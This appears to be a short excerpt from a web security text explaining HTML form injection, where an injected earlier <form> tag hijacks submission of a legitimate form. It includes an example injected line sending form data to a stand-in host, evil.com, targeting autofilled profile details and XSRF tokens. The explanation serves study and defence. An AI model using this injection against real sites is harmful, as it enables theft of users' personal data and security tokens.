<title>Form Injection</title>
</head><body>Another exfiltration opportunity is afforded by a peculiar property of HTML: The &lt;form&gt; tag can't be nested, and the top-level occurrence of this markup always takes precedence over subsequent appearances. This allows the attacker to change the URL to which any existing form will be submitted, simply by injecting an additional form definition in the preceding portion of the document:<br/>
<br/>
&lt;form action='http://evil.com/log.cgi'&gt; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; ← Injected line<br/>
...<br/>
&lt;form action='update_profile.php'&gt; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;← Legitimate, pre-existing form<br/>
...<br/>
&lt;input type="text" name="real_name" value="John Q. Public"&gt;<br/>
...<br/>
&lt;/form&gt;<br/>
<br/>
This attack is particularly interesting when used to target forms automatically populated with user-specific secrets - as would be the case with any forms used to update profile information, shipping or billing address, or other contact data; form-based XSRF tokens are also a possible target.</body></html>
